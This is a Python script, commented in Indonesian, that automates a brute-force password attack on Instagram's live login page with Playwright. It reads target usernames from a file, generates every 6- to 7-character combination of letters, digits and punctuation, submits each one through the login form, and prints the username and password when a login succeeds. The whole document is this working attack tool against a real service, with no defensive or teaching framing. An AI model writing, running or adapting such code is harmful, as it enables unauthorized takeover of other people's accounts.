import time
import string
import itertools
from playwright.sync_api import sync_playwright, expect
import sys

# --- Konfigurasi ---
TARGET_URL = "https://www.instagram.com/accounts/login"
FILE_USERNAME = "username.txt"  # File berisi daftar username, satu per baris

# --- Selector HTML ---
USERNAME_SELECTOR = '[name="username"]'
PASSWORD_SELECTOR = '[name="password"]'

def baca_file_ke_list(nama_file):
    """Fungsi untuk membaca setiap baris dari file ke dalam sebuah list."""
    try:
        with open(nama_file, 'r') as f:
            items = [line.strip() for line in f if line.strip()]
            print(f"[INFO] Berhasil memuat {len(items)} item dari '{nama_file}'.")
            return items
    except FileNotFoundError:
        print(f"[ERROR] File tidak ditemukan: '{nama_file}'")
        return None

def generate_passwords(min_length=6, max_length=7):
    """Fungsi untuk menghasilkan password dari kombinasi karakter."""
    chars = string.ascii_letters + string.digits + string.punctuation
    for length in range(min_length, max_length + 1):
        for password in itertools.product(chars, repeat=length):
            yield ''.join(password)

def coba_login(page, username, password):
    """Fungsi untuk mencoba login dengan username dan password tertentu."""
    try:
        print(f"Mencoba: {username} / {password}")
        page.goto(TARGET_URL, timeout=30000)
        time.sleep(3)  # Jeda agar halaman stabil
        
        page.locator(USERNAME_SELECTOR).fill(username)
        page.locator(PASSWORD_SELECTOR).fill(password)
        page.get_by_role("button", name="Log in", exact=True).click()
        
        # Cek hasil login
        error_locator = page.get_by_text("Sorry, your password was incorrect.")
        expect(error_locator).to_be_visible(timeout=5000)
        print(f"\033[91m[GAGAL] Kombinasi tidak berhasil.\033[0m")

        # Refresh halaman untuk percobaan berikutnya
        page.reload()
        time.sleep(2)  # Jeda setelah refresh untuk stabilitas
        return False  # Menandakan login gagal

    except Exception:
        # Jika pesan error TIDAK ditemukan, kita anggap sukses
        if "/accounts/login" not in page.url:
            print("\n" + "="*40)
            print(f"\033[92m[SUKSES] Login Berhasil!\033[0m")
            print(f"Username: {username}")
            print(f"Password: {password}")
            print("="*40)
            return True  # Menandakan login berhasil
        else:
            print(f"\033[93m[TIDAK DIKETAHUI] Terjadi error tak terduga atau halaman tidak merespons.\033[0m")
            return False  # Menandakan login gagal

def jalankan_bruteforce():
    # 1. Baca semua data dari file
    daftar_username = baca_file_ke_list(FILE_USERNAME)

    if daftar_username is None:
        sys.exit("Pastikan file username ada di folder yang sama.")
        
    # 2. Loop untuk mencoba setiap username dengan password yang dihasilkan
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        page = browser.new_page()
        
        for username in daftar_username:
            for password in generate_passwords():
                if coba_login(page, username, password):
                    # Jika login berhasil, tutup browser
                    browser.close()
                    return  # Hentikan eksekusi

        # Menutup browser setelah semua percobaan selesai
        browser.close()

if __name__ == "__main__":
    jalankan_bruteforce()
